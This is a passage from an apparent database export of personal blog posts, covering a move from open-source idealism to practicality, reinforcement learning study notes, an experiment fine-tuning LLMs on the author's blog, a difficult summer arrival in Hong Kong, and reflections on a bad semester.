For instance, I need to use phones, or else I willhave difficulty surviving in this world nowadays.</p><p>But anyway, I decided to take a small step towards Open Source &amp;Security.</p><h3>How?</h3><p>So basically almost all my applications on the computer(archlinux) are opensource now, I made this switch.</p><p>Google Chrome -&gt; Chromium<br>VS Code -&gt; OSS Code<br>Google -&gt; DuckDuckGo<br>YouTube -&gt; Invidious<br>MSOffice-&gt; OnlyOffice</p><h3>Crappy Social Media</h3><p>Then I decided to almost completely stop using Twitter, Reddit, Discord,Telegram. The reason is that there are no healthy things on Twitter andno knowledge of all of them. Twitter is just a toxic and malicious areafilled with adult content and nothing useful. Similarly Reddit andTelegram is filled with adult content, addictive and toxic, veryunhealthy, and full of garbage. Discord is boring and full of gaming,like full of rubbish. The only reason I am still using Instagram isbecause some people I follow are on Instagram, but then I decided toonly use Instagram on my phone since I think it is more of a phone app.Social media is just bad for me.</p><h2>Things with no Alternatives</h2><p>Gmail has no alternative since it is the Berkeley mail and I must usethat.</p><p>Some very crappy Chinese software cannot be replaced after I go back toChina.</p><h2>Updates 2024.6</h2><p>These days I value simplicity and practicality.</p><h2>Fine with Proprietary Software</h2><p>I have no problems with proprietary software because they are unavoidable and many of them are superior, and avoiding them only makes my life harder. However those proprietary software still need to respect the user to a certain extent. There is no point in avoiding Google Chrome and established platforms like social media.</p><p>Besides companies need to earn money and it is reasonable if they are hiding some competitive edges in their code.</p><h2>More of a Hobby</h2><p>Many of those things, e.g., device exploration, niche open source softwares, are more of a hobby than an actual daily use case. Some of them have slow speeds, and not modern practices.</p><p>They can be very interesting hobbies, however, most situations our times are more important and can be utilized to do other things, and they are mostly not suited for daily usage.</p><p>For example, if you tinker with Linux too much, you may risk bricking the system. I bricked my system at least 3 times, either when the boot partition got corrupted or the fstab got misconfigured. It is awfully frustrating and not constructive in daily life.</p><h2>Security and Privacy, Does it Matter?</h2><p>I realized I don't really care about my security and privacy that much. There is no point in avoiding YouTube or Gmail intentionally as they are still the best platforms out there. Practicality, in fact, is a far more important concept.</p><p>People's information is everywhere with a click, especially in the United States. Go to any people's search platforms and you can see people's addresses and phone numbers, it is just insane how much information is already leaked. Someone with a Python bot can crawl millions of people and addresses from these websites, and even if you take them down or hide them from public view, they are still there.</p><p>Moreover, my passwords are already stored safely in KeePass, and one platform breaching them doesn't leak my other platform's randomly generated long unguessable passwords.</p><p>As for privacy or data, it doesn't matter if companies sell them or not because most of them are already available anyway, and for a person void on social media, I don't get a lot of advertising.</p><p>I appreciate Google because it gives so much free space and YouTube is so free, not charging anything for its CDN costs. I would be willing to pay for YouTube for the CDN and bandwidth cost, though. That said, Google is also an optional platform and doesn't force everybody to use it. These big companies are pioneers in open-source projects(except Apple it seems). Without these top companies designing excellent open source projects, my life would be a lot harder though.</p><p>So called \"private DuckDuckGo\" browser went down when Bing's API had a problem, so it implies DuckDuckGo relies heavily on Bing for search results, and that implies it is not that private anyway.</p><p>I don't blindly use any Google Service but it is a very great tool. Google Docs or Slides are the most convenient office suits out there. They can even be used offline in a browser.</p><p>After all, sticking to strict open source guidelines won't improve my tech skills, just very niche things isolating me more from the society I am already isolated from.</p><p>Moreover, in China, the government knows all about your data.</p><p>Companies selling my data don't endanger me in any way, as I am just a regular person. I would, of course, avoid plain-word passwords or plain-word bank accounts or identification numbers.</p><p>Maintaining a practical approach instead of debating about what is ideal is very beneficial.</p><h2>Why Don't I Use Some Services?</h2><p>I don't use some services not because they are proprietary. I was mistaken in my previous approach and I am now emphasizing the utility. I am not using some services because of other reasons.</p><p>I don't use some social media because they feel overwhelming not because they are proprietary. Similarly, I also quit Mastodon and Pixelfed from Fediverse, as they contain views that are too polarizing and not constructive.</p><p>I don't like TikTok not because of privacy reasons but because I just don't like short videos, people can have choices and preferences.</p><p>There are, however, still some services I might not be contented with. For example, BaiduNetDisk requires downloading a client to download any files(which in turn not only bloats the system but always shows a floating icon, which I find annoying). It simply doesn't respect the user. BaiduNetDisk also restricts the free tier downloading speed to 50 KB per second, absolutely ridiculous and egregious behavior from the company. I thought the network speed depends on my Internet's bandwidth and the Company's server's bandwidth, and it lacks transparency and respect for its users.</p><p>Similarly, I really dislike CSDN because it hides the copy paste functionality with some stupid Javascript intentionally, forcing users to log in. These acts doesn't benefit the company but forces the users to pay or log in. Copying code can be done easily from the browser debug console anyways. They simply disregard the need to benefit the users, instead, focusing on maintaining a dictatorship and autonomy, without actual benefits or superior quality, which makes me annoyed.</p><p>I don't use Proton anymore because the bridge is too hard to configure, forcing the user to stick to the Proton Mail Client when using it. Furthermore, Proton is also proprietary. While popular and overall a very good app, it provides no advantage over Gmail.</p><h2>Why Don't I use Windows now?</h2><p>I don't use windows not because it is proprietary. I like the Google Services on Android though, which are proprietary too. I dislike Windows because it isn't ideal for development and lacks a good package manager, hides too much things through GUI. I don't know what is going on down inside it and using Ubuntu is just faster. I went back to Ubuntu simply because the usage experience is almost the same for me as ArchLinux, I don't notice any difference except package management, in which case I add debs instead of using AUR. I use Ubuntu primarily because most servers use Ubuntu, giving me a seamless transition between my laptop and servers, and in turn, making my life easier.</p><h2>About \"Recall\"</h2><p>I don't like the idea of Microsoft Recall which takes screenshots every few seconds, not because it is a leak of privacy or security breach, but because I find it unnecessary, and doing so probably makes my battery consume more power.</p><p>That said, I am still very enthusiastic about the SnapDragon Elite Chip, and if I can run Linux on it seamless I would be willing to use that.</p><h2>Why Don't I use Apple?</h2><p>I don't like Apple not because it is proprietary. In fact, I do like Apple's interface. Apple has so called \"clean\" and \"minimalistic\" interface and style.</p><p>I don't like Apple because it always create a mysterious or magical atmosphere with its products, usually causing confusion to me. Furthermore, I bricked every Apple device I got with either jailbreaking or removing the recovery shell.</p><p>I value utility, ease of use, and actual transparency, basically \"user's freedom and flexibility\", on the products I use, which Apple fails to address(being a walled garden). You can't even run MacOS on non Mac devices(or some people might but it's not a wide practice)</p><h2>Toxicity in Open Source Community</h2><p>There is often a \"toxic\" superiority in open source community that goes like \"I am superior than you because I use open source\", but actually meaningless. Some people believe they are superior because they use \"ArchLinux\", which isn't quite true. While ArchLinux usually requires some command line proficiency to install, Ubuntu can also be installed via command line and tinkered extensively. There is no superiority between operating systems and only utility and widespread usage.</p><p>That said, these people neither represent the open source community nor does that implicate that open source community is toxic as a whole. In fact, I find many people very friendly and constructive. Open source community was the reason I got interested in technology, and I would be forever grateful for it leading me in the early days I studied computer.</p><p>In fact, Microsoft contributed so much to the open source community, including VSCode and Typescript, which are essential tools for today's developement. Downplaying big company's contributions for niche applications is wrong.</p><h2>Conclusion</h2><p>Basically these things are part of my guidelines at least for now</p><ul><li>Superiority and Practicality</li><li>Flexibility and Freedom</li></ul><p>In the end it's all about personal choices.</p>", "createdAt": {"$date": "2024-09-20T09:48:49.136Z"}, "__v": 0}]

I am too tired to type all the latex down so I turned out screenshot them instead. I am really thankful!\n\nI shitted myself in CS 285 but this is like, half a year after ending that challenging struggling class and I somehow think RL is really fun now!\n\nThen again I hate taking notes but here we are again.\n\n## Imitation Learning\n\n### Behavioral Cloning\n\n- Generalize an expert's performance on custom Networks and train the Network to behave like the expert. We don't even care about reward in Imitation Learning.\n- Augement data: For example: Use 3 cameras in a self driving cars instead of one.\n-  Problems: If policy make mistake, likely make more mistakes deriving from expert policy. If data have moremistakes, imitation learning might work better. \n- Outputs: Latent variable models, Multi variable Gaussian, Transformer based models,   Diffusion based models.\n\n### Dagger\n\n- Run policy, ask humans to label them, then aggregate.\n- Problem: Human are bad at providing some kind of actions like controlling a complicated robot\n\n\n## Comparision between Samply Efficiency\n\nMore efficient (fewer samples) to Less efficient (more samples):\n1. Model-based shallow RL\n2. Model-based deep RL\n3. Off-policy Q-function learning\n4. Actor-critic methods\n5. On-policy policy gradient\n6. Evolutionary/gradient-free\n\n## Model Free RL\n\nModel Free RL are better suited for scenarios hard to describe with a model. Model Free RL is harder to generalize within a game but easier to generalize across games.\n\nModel Free RL is typically suited for Atari games or some fighting games.\n\n## The goal of Reinforcement Learning\n\n$$p_{\\theta}(s_1, a_1, \\ldots, s_T, a_T) = p(s_1) \\prod_{t=1}^T \\pi_{\\theta}(a_t|s_t)p(s_{t+1}|s_t, a_t)$$\n\n\n$$\\theta^* = \\arg\\max_{\\theta} E_{\\tau \\sim p_{\\theta}(\\tau)} \\left[ \\sum_t r(s_t, a_t) \\right]$$\n\n## Policy Gradient\n\nDifferentiate the policy to optimize, make good trajs more likely and bad trajs less likely\n\n![Image](https://cdn.jimchen.me/e30e331d-400d-4985-a414-75c4d5fc4859-1726726222653.jpg)\n\n![Image](https://cdn.jimchen.me/49a7052a-1598-42f7-9f0c-d6707b745afc-1726726606576.jpg)\n\n## REINFORCE algorithm\n\nSample $\\{r^i\\}$ from $\\pi_\\theta(\\mathbf{a}_t|\\mathbf{s}_t)$\n\n$$\\nabla_\\theta J(\\theta) \\approx \\sum_i (\\sum_t \\nabla_\\theta \\log \\pi_\\theta(\\mathbf{a}_t^i|\\mathbf{s}_t^i)) (\\sum_t r(\\mathbf{s}_t^i, \\mathbf{a}_t^i))$$\n\n$$\\theta \\leftarrow \\theta + \\alpha \\nabla_\\theta J(\\theta)$$\n\n### Reduce Variance\n\n1. Causality\n$$\\nabla_\\theta J(\\theta) \\approx \\frac{1}{N} \\sum_{i=1}^N \\sum_{t=1}^T \\nabla_\\theta \\log \\pi_\\theta(a_{i,t}|s_{i,t}) \\sum_{t^{1}=t}^T r(s_{i,t^{1}}, a_{i,t^{1}}) $$\n\n2. Baselines\n3. Off-Policy: Use recent policies to train\n\n## Actor-Critic Algorithm\n\nbatch actor-critic\n\n1. sample ${s_{i},a_{i}}$ from $\\pi_{\\theta}(a|s)$\n2. fit $\\hat{V}_{\\phi}^{\\pi}(s)$ to fit target $r+\\gamma \\hat{V}^{\\pi}(s^{1}) $\n3. evaluate $$\\hat{A}^\\pi(s_i, a_i) = r(s_i, a_i) +\\gamma \\hat{V}^{\\pi}(s_i^{1}) - \\hat{V}^{\\pi}(s_i)$$\n4. $\\nabla_\\theta J(\\theta) \\approx \\sum_i \\nabla_\\theta \\log \\pi_\\theta(\\mathbf{a}_i|\\mathbf{s}_i)\\hat{A}^\\pi(\\mathbf{s}_i, \\mathbf{a}_i)$\n5. $\\theta \\leftarrow \\theta + \\alpha \\nabla_\\theta J(\\theta)$\n\nSo like basically in Actor Critic here we have 2 networks to do different stuff(Policy, Value) while Policy Gradient have only 1. But Actor Critic's 2 networks are different with Double DQN in that they evaluate different things while DQN only evalutes the Value for each state and action (so Actor Critic is better at tackling problems with harder action spaces). Policy Gradient is purely policy-based while Double DQN is purely value-based. Policy Gradient typically have large variance and not as robust as Actor Critic.\n\nWe can also use Actor Critic off policy. But there are 2 problems: the actions come from older actors, and actions don't come from policies. We can do this  by evaluating the value network based on Q values instead of value functions, then evaluating the policy network with Q values instead of advantages.\n\n![Image](https://cdn.jimchen.me/c9c74bba-6ee9-4718-9a0c-1bc81dfb9567-1726728212737.jpg)\n\n\n## DQN \n\n![Image](https://cdn.jimchen.me/fbb62bf3-9677-4b9f-8c72-2201e2bbdf52-1722079326770.jpg) \n\nBut we can improve\n\n1. Overestimation $E[max(X_{1},X_{2})]\\geq max(E[X_{1},X_{2}] $\n\nSo we can use Double DQN(slower update to Target Network) or N-step returns (better evaluation)\n\n## Advanced Policy Gradient \n\nLecture 9\nLecture 10\nLecture 11\nLecture 12\nLecture 13\nLecture 14\nLecture 15\nLecture 16\nLecture 17\nLecture 18\nLecture 19\nLecture 20\nLecture 21\nLecture 22\n\n\n\n\n## Inverse RL\n\nInverse RL is about inferring about reward functions.\n\nGiven states s $\\in$ S, actions a $\\in$ A, transitions p(s'|s,a), samples ${r_{i}}$ from $\\pi^{*}(\\tau)$, learn $r_{\\phi}(s,a)$\n\n# Model Based RL\n\nModel Based RL is typically suited for a scenario with easy rules, like Go, 2048.\n\nModel Based RL is very sample efficient.\n\nSome notable works include Alpha Zero and Muzero(with MCTS)\n\n## What is not Meaningful for RL?\n\n\nSome RL problems can be very challenging but meaningful and I can learn a lot by doing them, however, some RL problems just aren't meaningful to attempt. I learned to painful lesson. \n\n- **Too many randomness**: Like how to win a lottery\n- **Too heavy GUIs**: Graphic games need manual design extensive api (possibly with Selenium or Puppeteer or AutoGui tools) and image processing to feed into RL\n- **Real time fighting games**: Time sensitive\n- **Games that can be solved by easy Algorithm**: e.g. Minesweeper, RL will be overkill \n- **General Space**: RL is currently usually done is an abstract space \n\nYeah like basically Openai can do it easily but it's definitely not for me(too complex).\n\n## Conclusion\n\nTasks that human perceive as hard might be easy (e.g. abstract space complicated decision making)\n\nTasks that human perceive as easy might be extremeley hard(e.g. 4 year old picking up a book and ...)\n\n", "date": {"$date": "2024-07-26T16:02:46.046Z"}, "__v": 0}, {"_id": {"$oid": "66ebe945f24e7c3e85e8de9a"}, "title": "Finetuning LLMs on my Blog", "type": "ml", "access": 1, "body": "\n## Reading Finetuning from AWS's Blog\n\nAWS published a [machine learning blog](https://aws.amazon.com/blogs/aws/anthropics-claude-3-haiku-model-is-now-available-in-amazon-bedrock) about how you can finetune Claude 3 Haiku on the Bedrock really easily, and it got me very interested and wanted to set up Haiku to imitate me. Specifically my blog has around 100k words in it, so that is a good starting point I guess.\n\nBad news is that AWS don't allow me to tune it, got me pretty mad actually.\n\nI contacted AWS for access to finetune Claude Haiku and it didn't respond.\n\n## Openai's Models\n\nThere was those old GPT3.5 models for finetuning, but even without finetuning they not the smartest, and after finetuning they hardly learn anything actually.\n\nGPT's more capable models like GPT4 are unavailable for finetuning.\n\n## Generate a Question for each Sentence\n\nI used nltk to parse the sentences from my blogs, as well as remove all code snippets and weird symbols. Anyways I parsed each blog to seperate sentences and asked Claude Haiku to generate a question based on each sentence. I got that done and there was approximately 4000 pairs of questions and sentences.\n\nI then add a system prompt for each blog like \"You are talking to Jim Chen about {blogname}\" to the LLM training script.\n\n## Different Approahces\n\nAfter that I tried multiple strategies, and there is \"multiturn finetuning\".\n\nFirst approach I tried was to seperate all sentences or pairs and got 4000 pairs feeding into the LLM, it was pretty bad, and the LLM hardly make any sense with huge loss.\n\nSecond appraoch I tried was to group 5 sentences for each response into a conversation, and it was much better and got way better results. The results got even better when I generated them multiple times(so that the questions to the answers have different variations)\n\nThird approach I tried to group entire blogs into one conversation. At this point AWS Bedrock starts rate limiting me for calling Claude Haiku to generate this stuff for no reason, and I switched from east to west and kept calling(since I activated both AWS regions). But this approach turns out not good. (models cannot learn well)\n\nAlso I tried to make the questions shorter like very short questions for each sentences, but it worked terribly.\n\n### Finetuning on Cohere\n\nThere is also an [AWS blog](https://aws.amazon.com/blogs/machine-learning/amazon-sagemaker-unveils-the-cohere-command-r-fine-tuning-model/) about how to finetune the cohere on Sagemaker, but it was complicated and finetuning on Cohere took me no time to figure out how to do it.\n\nCohere's frontend is made in NextJS, however, it frequently run into bugs(almost the same bugs like client error as I would see when I am debugging a website lol, and this much amount of bugs for a single user suggets their web devs might not be capable people), and it's ok since they are primarily an AI company and Gomez started it so young they are probably not a large company or what. I managed to create some Finetuning jobs and they asked me for my company(which I just entered some random words), and passed it.\n\nAfter some finetuning jobs, however, I couldn't do it anymore. I figured maybe it was a free trial or something, but Cohere doesn't have extensive documents and it was buggy as hell, so every time I tried to create a finetuning job it returned error without any debugging messages.\n\nAnyways this is so annoying and I got sick of all the bugs I am running into. Literally I am running into all the bugs nobody's running into before, and I am always the one having to deal with buggy programs and GUI programs seem to target me(or just don't work with me). I tried to contact Cohere but they didn't have any emails or Reddit(only a Discord server, which I don't use).\n\nThen I quickly used the Berkeley email to open up another account and finished finetuning there.\n\n### Cohere Command R Results\n\nSo I finally settled with the second approach stated above, like put 5 pairs into a conversation then feed it to Cohere. I ended up like with 6 MB file and the result was like 55 percent.\n\nIt wasn't that bad.\n\nSome example prompts\n\n```\nwho are you\nI am Jim Chen, and I am currently doing self study in computer science.\n```\nFine, right?\n```\nwhich school do you go to\nI am in Shanghai and I go to Shanghai International School.\n```\nemm, I didn't go to that school, but I ask again\n```\nwhich school do you go to\nI go to the University of California, Berkeley.\n```\nI sadly can't go to that school now too. It was so sad, man, Berkeley is paradise for computer science. Anyways most of my previous blogs written in Berkeley got into the dataset.\n\nBelow are some decent responses:\n\n```\nwhere do you like to go in Shanghai\nI like going to Yangpu district, it is quiet and not crowded.\nwhat is your hobby\nI like to walk around, and I am also fond of hiking.\nhow do you think about windows os\nWindows is a very crappy operating system, and I am surprised Microsoft is still selling it.\nhow do you like open source?\nI like open source because it is free and customizable.\n```\n\nSome bad responses\n\n```\nwhat is your interest\nI am also interested in some other stuff like video games and sports.\nwhat is your interest\nI am also interested in various other things like politics, history, and the human mind.\nwhat is your interest\nI am interested in machine learning and computer science in general.\n```\n\nI set the temperature to be 0.7 and it got right on 3rd response.\n\n### ChatGPT4o-mini\n\nThe next day I received an email informing me that ChatGPT 4o-mini is available ot be finetuned, and yeah, so we went on real quick and fed in the multi-conversation, the training loss looked good\n\n![Image](https://cdn.jimchen.me/87096597-a943-4480-91de-f26584fd94b1-1721783467004.jpg)\n\nBut the results are horrible, I set the temperature at 0.5 and it got everything wrong\n```\nwhich school you are in\nI am in Shanghai Jiao Tong University.\nwhich high school did you went to \nI also went to high school in Shanghai High School.\nwhat interest you have\nI am interested in Linux and ReactJS. I also like computer games.\n```\n\nI set the temperature to 0, and it was still bad\n```\nwhat school did you go to\nI went to Shanghai Jiao Tong University for undergraduate.\nhow do you think about windows os\nWindows OS is a mixed bag it can be very annoying to use but also very fun and interesting at the same time.\n```\nChatGPT hallucinates way too much.", "date": {"$date": "2024-07-23T14:56:05.417Z"}, "__v": 0}, {"_id": {"$oid": "66ebe945f24e7c3e85e8de9b"}, "title": "Horrible Start of Summer in Hong Kong", "type": "journal", "access": 1, "body": "So following the [horrible semester end](https://jimchen.me?title=Another%20Horrible%20Semester-How%20to%20Cope%20Next), came a horrible start of summer. I was gonna join the HKUST research program, but it started very wrong.\n\n\n## Didn't Get Exit Endorsement when Arriving\n\nSo I didn't get an exit endorsement for study, or a D visa when I got here.\n\nAnother reason not to use Chinese, it is simply too hard and too ambiguous(or simply I am too bad at Chinese) I would prefer to use English for any kind of documentation and communication from now on, I think.\n\nIt's sort of like this, you need to get a student visa from a Hong Kong university(like HKUST), then go to the local office in Mainland China to get a stamp.\n\n## Worried Sick in PreDawn Hours\n\nSo I went here and got stuck in the customs. I tried to go through the customs and showed the person my student visa but she wouldn't let me in, saying I could only go with a traveling visa(needing to exit for 7 days).\n\nI arrived at around 0:30 on July 1st, and I was worried sick in the predawn hours. I thought about calling my parents but they were sound asleep and on their way to Northern Europe.\n\n## Going Out of the Station\n\nAfter 4 hours I finally decided to go out of the station and went on a bus to HKUST. I was really anxious and told to leave in 7 days.\n\n\n![Image](https://cdn.jimchen.me/4db2f1af-cd34-4ef0-8ec9-484db0130bf0-1720499916868.jpg)\n\n![Image](https://cdn.jimchen.me/5c3a1813-b2d7-45b0-8b3f-bb0d40e054ca-1720500480889.jpg)\n\n## Seeing Dockers and Podmans on the Bus\n\nI saw Dockers and Podman on the bus. I didn't take pictures of them. \n\nTurned out the Dockers are actually cranes on a dock for handling containers(so I gave them the name \"Docker\"), and the Podman are actually workers on a dock (I gave it the name \"Podman\", I blurted out the word without a second thought)\n\nSo I arrived at HKUST at around 7 am, and dude, was I tired? It was so hot.\n\n## Joining the Flag Raising Ceremony\n\nI joined the flag-raising ceremony that day with my schoolmates. It was like singing Hong Kong's anthem and China's National Anthem celebrating Hong Kong's 27th anniversary of returning to China.\n\nThere were Hong Kong police(the host said they are from HKUST). They are a tall and handsome young man. It was raining hard.\n\n9 police were raising 3 flags, the Chinese National Flag, the Hong Kong Flag, and the HKUST flag, only the Chinese National Flag wouldn't raise, and they tried to raise it for some time, and it finally did.\n\nAfter that, we(USTC schoolmates who joined the research program) were taken to a room and asked to introduce ourselves. There was an alumnus (I think a professor in HKUST who was also from USTC undergrad chatted with us for a while about AI, Physics, and research in general). He praised `Claude Sonnet 3.5` for his extraordinary ability.\n\n## Contacting My Parents\n\nMy parents were helpful and provided guidance for me. Anyway, after lunch, I got on a bus to go back to Hong Kong airport(to go back to Shanghai).\n\nWell, my parents are the only people in this scenario that would support me though, so I guess I am very grateful.\n\n## Staying at Home from 7.2-7.8\n\nI stayed in Shanghai for a week waiting for my EEP to be stamped. I got out every 2 days to go around Shanghai and played with NEXTJS and MongoDB the other times.\n\nI cycled 40 kilometers from 0 to 3 am. \n![Image](https://cdn.jimchen.me/d31e17ab-036e-40a0-bf3e-805433eb770d-1720502159224.jpg)\n\n![Image](https://cdn.jimchen.me/772d4b48-c354-4c2d-8feb-b3da2c8cb5c0-1720502287061.jpg)\n\nThe other day I walked around 20 kilometers around Nanjing Road and People's Square and back to Shibei Middle School in XiZang Road, ahh the old days.  LIke the place changed a lot I would say but anyways, it was no longer relevant.\n\n## Going back Again at 7.8\n\nSo on 7.8, I got my visa stamped, and I booked a plane ticket rat night right away.\n\nIt was past midnight when I got out so I decided to stay a few more hours at the airport and went on the bus at around 5:30 am.\n\nEverything turned out fine and the professor asked me to book a time to meet. (I got so touched by understanding like literally, I didn't expect anyone to understand my problematic behavior)\n\n\n## Some Pictures I Took on the Bus with my favorite Phone `Google Pixel 8 Pro`\n\n![Image](https://cdn.jimchen.me/48beba87-679e-4270-a83a-252f8ce91c16-1720499961441.jpg)\n![Image](https://cdn.jimchen.me/77b9f0d5-e8b6-4938-818d-1db14983b04a-1720500362308.jpg)\n\n\n## Dorm\n\nI am so lucky to have a single dorm(staying alone in a 2 person room).\n![Image](https://cdn.jimchen.me/55597026-02ad-46a4-8a75-4ba6e2553191-1720500791294.jpg)\n\nPeople say it's insanely difficult to find a house in Hong Kong, so I'm really lucky that I got a house in Hong Kong like the school provided one for me.\n\n## Octopus Card\n\nBuy an Octopus Card at a subway station out of the airport.\n\n## Chargers\n\nNeed a converter \n\n![Image](https://cdn.jimchen.me/979e0d13-ba2b-4bc7-8c39-473399e74936-1720500897124.jpg)\n\n## Sim Card\n\nCan get one at Seven Eleven. \n\n## Cantonese??\n\nI can't speak Cantonese and I can't understand Cantonese. In fact, I struggle to understand Mandarin. Just use English as it's also the official language here.\n\n## Foods\nThere are all kinds of food here. There's some McDonald's and it was delicious. \n\nYou can pay by both WeChat, Octopus, and a bank card like pay by both methods in China and the United States.\n\n## Scenery\n\n![Image](https://cdn.jimchen.me/47616a21-ee27-4830-9b29-44c56e3430c5-1720503533071.jpg)\n\n## Queuing Culture\n\nHong Kong has a queuing culture. I used to lurk around and jump to the start of the line at any opportunity,  that's how it works in mainland China anyways. However here it was considered very rude and problematic behavior(I went on a bus like that and was frowned upon, people don't queue for a bus in mainland China, just rushes on at first opportunity). So in the end I usually just wait till everyone else finishes and quietly waits at the end of the line.\n\n## Other Rules\n\nHong Kong has some very strict rules.\n\nFor example you get into jail for shoplifting. I was like what? In US it seems like a fine and warning is just the usual procedure for dealing with this kind of stuff.\n\nSmoking gets fined for thousands of HK dollars(like several hundred USD) it is that strict. Of course I never smoke, just imagine those people who smoke literally everywhere in mainland China.\n\nLittering gets fined for a lot of dollars. Also partial culture shock since in Berkeley there was this place called people's park where there are tents with groups of homeless people and trash and dirty smell everywhere. In Hefei though there aren't groups of homeless people you can see lots of stores with smelly garbage right in front of it.\n\nAlso spitting is considered very bad. Imagine those heavy smokers who spit regularly.\n\nAlso you don't eat or drink in public transportations.\n\nLike following the rules isn't just limited to white collars here, but hard labor people also follow the rules, so it's pretty amazing what this city is.\n\nIn many ways Hong Kong is akin to what I heard about Singapore, except good news you won't have to go through conscription, one of the worst nightmares in life.\n\nSo in conclusion it's best to mind my \"problematic\" behaviors and not get into trouble here \ud83d\ude35\u200d\ud83d\udcab. I already had problems of a lifetime last semester, hopefully everything will go on smoothly. It's necessary to mind my behaviors \ud83d\udc4d.\n\nLike some people are just known to be smooth in life and not cause any troubles, while me on the other hand causes small troubles regularly. Although I never caused any great troubles fortunately. \n\nAlso it's not like you can't go off wandering in daydream cuz like you can basically end up in great trouble if you just go to a store then in daydream pick something and get out of it store with it with no bad intentions.\n\n\n## Clear Water Bay\n\n![Image](https://cdn.jimchen.me/18f109fe-60d8-41cd-8fff-5005f44d57cd-1721809966543.jpg)\n\n![Image](https://cdn.jimchen.me/248db41b-4f63-4d61-9df7-15a11aaf6ecd-1721809995359.jpg)\n![Image](https://cdn.jimchen.me/be5dc11c-7e37-4bc5-bb71-3248290d1183-1721810049419.jpg)\n\nToday I finally decided to go out, despite the heat. So basically I hopped on bus 91 and here I am in Clearwater bay but it's a pretty good place\n\nThere is a beautiful beach here it's like a lot of young children like kindergarten to like just normal children, a lot of people here there's a boats and yeah it's pretty fine. I just accidentally came here actually like since we hopped on bus 91 and I don't know where to go, like the bus 91 just took me to the terminal station where it's a pleasant little beach. The beach is kind of small to be honest, like it's not a long way but like there's a lot of people I feel a little bit better despite the ongoing stress. There's such a large number of young people, like a lot younger than me.\n\nIt basically quickly became like real hot and it was quite mountainous. There's a lot of ups and downs this beach is uh somehow like a tiny fraction of a beach you would see in like San Francisco but anyways like it's really fine. I'm just going away from the beach going to somewhere like hopefully a populous like city whatever.\n\nSo basically I went into a Japan home shop, and I was like, are there clothes, are there like utility stuff, and then they're like, we don't speak English. I don't understand a word what they're saying, and basically, so they are like we can communicate in Mandarin and I was like fine and tried to communicate. They ended up understanding me and the shop assistant's like, he actually speaks great Mandarin. That was the first time I got a compliment when I was speaking in Mandarin, though. After all what's the point of being in Mandarin so hard?\n", "date": {"$date": "2024-07-09T03:50:13.337Z"}, "__v": 0}, {"_id": {"$oid": "66ebe945f24e7c3e85e8de9c"}, "title": "Another Horrible Semester-How to Cope Next", "type": "journal", "access": 1, "body": "I had a very very bad end of the semester. This is a very very sad post. I am very guilty and in self-doubt right now.\n\n## End of Semester: Mental Breakdown\n\nSo what happened at the end of last semester was I had a complete mental breakdown, the worst I ever had. It was expected, given that the semester had already seen strong resistance and unwillingness to study or do any work.\n\nLike I just hated school, that's it.\n\nI will tell you about June.\n\n## Being Addicted to AWS\n\nAt the start of June, I got addicted to AWS, it was so cool and comprehensive and the best thing I ever had. I got addicted to AWS and I couldn't do anything else. Every night I would play something on AWS(with NEXTJS), and then it would become dawn, and I would go to sleep after eating breakfast, then when I woke up soon it would be night again, and I hurried to do some limited work before diving right back into my laptop.\n\n## The Feeling of Actually Building Something\n\nThe feeling of building something was very important to me, and something I lacked last semester. I didn't have the practical feeling of accomplishing things, on the contrary, I was usually being fed materials like a pig, and did not have any autonomy to do anything I wanted.\n\n## Building Apps\n\nStarting in March I built like at least 6 web apps, taking into account my New Website. \n\n[After building AnonyTube](https://jimchen.me/?title=Coding%20a%20Full%20Stack%20Video%20Platform), I thought I would stop coding frontend and focus on school for a while. However, June saw a backslash of not wanting to do anything other than playing with cloud and frontend and web dev. Anyway, it was pretty sad.\n\nI built a markdown parser (since Joplin doesn't support review, and NocoDB doesn't support documents, Notion doesn't support full markdown). I connected the backend to MongoDB, my favorite database ever, so that all my data is organized and easily exported and analyzed, and I only write in markdown (and latex and some sane HTML for that matter)\n\nIt looks like this \n![Image](https://cdn.jimchen.me/6d567bff-19f5-4e3c-b690-db247e64a41d-1720495291978.jpg)\n\nI had no idea how long it took to build a fully polished app. Like, this app is still unpolished, but it already took enormous effort. The key takeaway here is that the open-source projects might not fully suit our needs, and the proprietary ones might also not suit our needs.\n\nI disliked Google Tasks and built a NEXTJS task manager myself, also with MongoDB, my favorite database. \n\nI also tried i18n on my website but gave up on it since the blogs are dynamically rendered. I wrote about 100k words total in all my blogs and translating that would not be a trivial task, and AWS translate is too bad(you also have to parse the markdown lol). Like the website is just made in English and anyone can use Google Translate if they don't understand it.\n\nDocker is so fantastic, like literally, it can containerize everything.\n\n## Unstable Schedules \n\nSo like I was mostly staying up all night or having very very instable schedules and not preparing for the tests, only doing some homework with minimal time and fully engaged in AWS, MongoDB, Docker Hub, NEXTJS, etc. Engaging in stuff makes me feel numb, and the semester passed leaving me feeling empty and sad.\n\n## Organized Everything into MongoDB\n\nBut anyway I finally organized everything into my self-hosted MongoDB, like, literally everything with Access Controls, which seems to be very satisfying despite failing in many courses in my school.\n\n\n## Challenges I faced with School\n\nLooking in retrospect, there are several great issues I had with school. Let me tell you what they are. I don't think I can have a balanced life with these issues.\n\n###  Time Commitment\n\nAfter selecting multiple courses you are expected to have full-time commitments to school(with little spare time for yourself), and given the large amounts of credits required for graduation you are expected to commit fully to school.\n\nIn a university setting I am expected not to put 80 or 90 percent of my time on school, instead, a more balanced approach would be better. I can put one-third on school, one-third on self-learning, and one-third on chilling or socializing. Instead, I was constantly overwhelmed by school, requiring me to put the full majority of time into it(like throughout the freshman and sophomore year), as a result, when I found out things are no better this semester, I became very rebellious.\n\n### OutDated Knowledge\n\nThe school is teaching outdated knowledge in computer science. It is greatly irritating how much they are behind(or subpar, since being behind is different). School is teaching me bad practices in computer science, and very wrong computer science knowledge.\n\nFor example, in an embedded system course, the teacher doesn't know \"gitignore\" and zips all files into several GB source code to download, with no clear comments, only a huge book of 1000 pages. Furthermore, the teacher expected me to understand everything myself(frequently threatening me with low grades if I didn't figure everything out myself). When I talked to him about command line and programming he shows a clear lack of the basics of computer science knowledge (frequently running into bugs he can't solve when trying to help me to debug the crappy program, doesn't know any command line).\n\nIn a database course, however, the teacher emphasized too much on the front end and interfaces and ignored important database knowledge. The teacher constantly, with outdated knowledge(not teaching MongoDB, spark, or distributed database, focusing too much on how to build an interface, with the interface being VB and outdated frameworks), wrong knowledge(you have to manually download the exe to update, correction: you can just sudo apt update && sudo apt upgrade or sudo package-manager upgrade, whatever works), and ambiguous projects that the TA struggles to explain. In the final project, the teacher said something very very ambiguous(a teacher management system), when I asked the TA he was like \"Don't care\", and \"One course can only be taught once a semester\", and 